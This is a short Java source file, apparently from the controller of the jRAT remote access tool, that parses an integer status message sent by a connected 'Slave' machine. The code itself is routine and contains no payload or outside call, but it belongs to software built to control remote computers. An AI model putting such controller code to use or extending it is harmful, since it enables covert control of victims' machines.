package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;

public class Packet2Status extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String status = slave.readLine();

		try {
			int istatus = Integer.parseInt(status);

			slave.setStatus(istatus);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
}
